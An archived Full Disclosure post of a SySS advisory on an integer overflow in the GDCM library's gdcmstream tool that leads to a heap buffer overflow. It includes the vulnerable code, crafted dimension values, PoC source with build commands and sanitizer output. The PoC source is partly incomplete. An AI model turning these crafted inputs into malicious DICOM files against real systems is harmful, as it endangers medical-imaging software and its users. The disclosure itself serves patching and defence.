---
title: [SYSS-2026-070]: GDCM (Grassroots DICOM) - Integer Overflow	(CWE-190)
url: https://seclists.org/fulldisclosure/2026/Sep/86
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:56:58.235947
---

# [SYSS-2026-070]: GDCM (Grassroots DICOM) - Integer Overflow	(CWE-190)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](85)
[By Date](date.html#86)
[![Next](/images/right-icon-16x16.png)](87)

[![Previous](/images/left-icon-16x16.png)](85)
[By Thread](index.html#86)
[![Next](/images/right-icon-16x16.png)](87)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-070]: GDCM (Grassroots DICOM) - Integer Overflow (CWE-190)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 23 Sep 2026 15:33:44 +0200

---

```
Advisory ID:               SYSS-2026-070
Product:                   GDCM (Grassroots DICOM)
Manufacturer:              GDCM Project
Affected Version(s):       3.3.0
Tested Version(s):         3.3.0
Vulnerability Type:        Integer Overflow (CWE-190)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-07-24
Public Disclosure:         2026-09-23
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

GDCM (Grassroots DICOM) is an open-source C++ library for reading, writing,
and processing DICOM (Digital Imaging and Communications in Medicine)
medical imaging files (see [1]).

The gdcmstream command-line tool, used for stream-based reading and writing
of DICOM images, is vulnerable to an integer overflow that leads to a heap
buffer overflow.

When processing JPEG2000-compressed DICOM files, the gdcmstream tool decodes
the embedded JPEG2000 codestream via OpenJPEG and allocates a buffer for the
raw pixel data. The buffer size is computed using 32-bit integer arithmetic
```

based on the image dimensions from the JPEG2000 codestream's SIZ marker.
When

```
the product exceeds 2^32, the result silently wraps around, causing an
undersized buffer allocation. The subsequent pixel data write loop then
overflows the heap buffer.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The vulnerable code is in the Write_Resolution function at
Applications/Cxx/gdcmstream.cxx:246-271:

  int Dimensions[2];
  {
    int compno = 0;
    opj_image_comp_t *comp = &image->comps[compno];
    Dimensions[0]= comp->w;
    Dimensions[1] = comp->h;
  }
  unsigned long rawlen = Dimensions[0]*Dimensions[1] * image->numcomps;
  char *raw = new char[rawlen];

  for (unsigned int compno = 0; compno < (unsigned int)image->numcomps;
       compno++)
  {
    const opj_image_comp_t *comp = &image->comps[compno];
    int w = comp->w;
    int h = comp->h;
    uint8_t *data8 = (uint8_t*)raw + compno;
    for (int i = 0; i < w * h; i++)
    {
      int v = image->comps[compno].data[i];
      *data8 = (uint8_t)v;
      data8 += image->numcomps;
    }
  }

The variables Dimensions[0] and Dimensions[1] are both 'int' (32-bit signed)
values converted from the OpenJPEG component structure's 'w' and 'h' fields,
which are OPJ_UINT32 (uint32_t). The variable image->numcomps is also
OPJ_UINT32 (uint32_t).

The multiplication Dimensions[0]*Dimensions[1] is performed in 'int' (32-bit
signed) arithmetic. The result is then multiplied by image->numcomps
(OPJ_UINT32). Due to C++ usual arithmetic conversions, when a signed int
and an unsigned int are multiplied, the signed int is converted to unsigned
int, and the multiplication is performed in 32-bit unsigned integer
arithmetic. The result is only widened to 'unsigned long' (64-bit) on
assignment to 'rawlen', after the overflow has already occurred.

When the product exceeds 2^32, it wraps around modulo 2^32, producing a
value much smaller than the actual amount of pixel data. The subsequent
write loop then writes w*h pixels for each component, each advancing the
write pointer by numcomps bytes, overflowing the undersized buffer on the
heap.

The JPEG2000 SIZ marker uses 32-bit unsigned values for Xsiz and Ysiz
(image dimensions), so values exceeding 65535 (the maximum representable in
the DICOM US VR used for Rows and Columns) are valid in a JPEG2000
codestream. This means a malicious JPEG2000 codestream embedded in a DICOM
file can set component dimensions that trigger the integer overflow without
needing to violate DICOM header constraints.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

A PoC was developed that uses the vulnerable code from Write_Resolution()
in gdcmstream.cxx (lines 246-271) to trigger a real heap buffer overflow
detected by AddressSanitizer.

The PoC constructs a real opj_image_t structure with crafted parameters:
  - numcomps = 65535 (maximum from a 16-bit J2K SIZ Csiz field)
  - Component 0: w = 65538, h = 1
  - Components 1..65534: w = 0, h = 0 (inner loop does not execute)

Overflow calculation:
  Step 1: Dimensions[0] * Dimensions[1] = 65538 * 1 = 65538
          (computed as 'int', fits within INT_MAX, no signed overflow)
  Step 2: 65538 * 65535 = 4,295,032,830
          (computed as uint32_t due to OPJ_UINT32 numcomps)
          uint32_t overflow: 4,295,032,830 mod 2^32 = 65,534
  Buffer allocated (rawlen): 65,534 bytes
  Actual data that will be written: 65538 * 65535 = 4,295,032,830 bytes
                                    (~4.00 GB)
  *** Buffer too small by 4,294,967,296 bytes ***

  Loop execution:
    i=0: write at raw[0]           — inside buffer (OK)
    i=1: write at raw[65535]       — OUTSIDE 65,534-byte buffer!

PoC source code:

  #include <cstdint>
  #include <cstdio>
  #include <cstdlib>
  #include <cstring>
  #include <openjpeg.h>

  /* Verbatim vulnerable code from gdcmstream.cxx:246-271 */
  static void trigger_vuln_13(opj_image_t *image)
  {
    int Dimensions[2];
    {
      int compno = 0;
      opj_image_comp_t *comp = &image->comps[compno];
      Dimensions[0] = comp->w;
      Dimensions[1] = comp->h;
    }
    unsigned long rawlen =
        Dimensions[0] * Dimensions[1] * image->numcomps;
    char *raw = new char[rawlen];

    for (unsigned int compno = 0;
         compno < (unsigned int)image->numcomps; compno++)
    {
      const opj_image_comp_t *comp = &image->comps[compno];
      int w = comp->w;
      int h = comp->h;
      uint8_t *data8 = (uint8_t *)raw + compno;
      for (int i = 0; i < w * h; i++)
      {
        int v = image->comps[compno].data[i];
        *data8 = (uint8_t)v;
        data8 += image->numcomps;
      }
    }
    delete[] raw;
  }

  int main()
  {
    /* Construct crafted opj_image_t with numcomps=65535, w=65538, h=1 */
    trigger_vuln(&image);
    return 0;
  }

To build and run the PoC:

  g++ -fsanitize=address -fno-omit-frame-pointer -g \
      -I/usr/include/openjpeg-2.5 \
      pocs/poc.cpp -o poc

  $ ./poc
  === PoC: Integer Overflow in gdcmstream J2K Decode (VULN-13) ===
  ...
  --- Triggering vulnerable code (gdcmstream.cxx:246-271) ---
  Calling trigger_vuln(image)...

  =================================================================
  ==10171==ERROR: AddressSanitizer: heap-buffer-overflow on address
  0x7e95d48047ff at pc 0x56007861f67a bp 0x7ffcb697e7e0
  sp 0x7ffcb697e7d0
  WRITE of size 1 at 0x7e95d48047ff thread T0
      #0 0x56007861f679 in trigger_vuln
          pocs/poc13_vuln13_real.cpp:122
      #1 0x56007861ff4c in main
          pocs/poc13_vuln13_real.cpp:234
  0x7e95d48047ff is located 1 bytes after 65534-byte region
  [0x7e95d47f4800,0x7e95d48047fe) allocated by thread T0 here:
      #0 0x7f85d5f2d431 in operator new[](unsigned long)
      #1 0x56007861f46d in trigger_vuln
          pocs/poc13_vuln13_real.cpp:110
  SUMMARY: Add...